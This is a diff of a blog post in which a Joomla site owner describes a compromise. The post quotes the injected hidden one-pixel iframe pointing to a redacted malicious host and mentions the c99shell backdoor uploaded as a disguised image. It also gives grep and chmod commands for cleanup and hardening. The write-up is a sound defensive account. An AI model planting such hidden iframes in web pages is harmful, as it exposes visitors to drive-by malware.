@@ -20,9 +20,9 @@ tags:
 
  The Hacker was inserting 2 strange line in my content. He has tampered:
 
- <span style="font-weight: bold;">`
+`
 
-`  <span style="font-weight: bold;">index.php  
+` index.php  
  <big>`<small>// displays queries performed for page
 
  if ($mosConfig_debug) {
@@ -46,7 +46,7 @@ tags:
  ?></small>`</big>  
  **<span style="color: rgb(255, 0, 0);"><iframe width=’1′ height=’1′ border=’0′ frameborder=’0′ src=’http://xxxx.info/stds/go.php?sid=3′></iframe>**
 
- AND <span style="font-weight: bold;">/index2.php
+ AND/index2.php
 
  ` <html xmlns="http://www.w3.org/1999/xhtml">
 
@@ -87,29 +87,29 @@ tags:
 
  `<span style="background-color: rgb(255, 255, 153);">xxxxx.info` I dont want to make publicity to this hacker by publishing his server url here
 
- <span style="font-weight: bold;">How to find all place potentialy infected?
+How to find all place potentialy infected?
 
  return a list of all files with path (-H) that contains the substring `xxxxx`
 
  `# find . -type f -exec grep -H xxxxx {} \;`
 
- <span style="font-weight: bold;">How did I get infected?
+How did I get infected?
 
  It seems that the hacker has use my demo site at [demo.waltercedric.com](http://demo.waltercedric.com/) to copy an image on the server or replace an existing one which was having bad user rights  
  It may be an image like this one runme.php.jpg this image then bootstrap and load a hacker tool c99shell (also known as PHP/C99Shell.A or Backdoor.PHP.C99Shell.c)
 
  PHP/C99Shell-A is a backdoor Trojan for platforms with PHP support, such as web servers. PHP/C99Shell-A listens for commands from a remote user.
 
- <span style="font-weight: bold;">How to avoid that next time
+How to avoid that next time
 
- <span style="font-weight: bold; background-color: rgb(255, 255, 255); color: rgb(255, 0, 0);">No file in apache root must have more than r–r–r– rights so here is a small scripts that you can crontab or save for periodically check. It automatically change all files to <span style="font-weight: bold;">read only for all, group and other   
+ <span style="font-weight: bold; background-color: rgb(255, 255, 255); color: rgb(255, 0, 0);">No file in apache root must have more than r–r–r– rights so here is a small scripts that you can crontab or save for periodically check. It automatically change all files toread only for all, group and other   
  `
 
  # find . -type f -perm 600 -exec chmod ago=r {} \;`
 
  Joomla! is automating during file save the CHMOD, but not on all files in the structure.
 
- <span style="color: rgb(255, 0, 0); font-weight: bold;"> Avoid any files with setguid in your apache root  
+  Avoid any files with setguid in your apache root  
  `# find . -type f -perm 600 -exec chmod ago=r {} \;`
 
  Note:
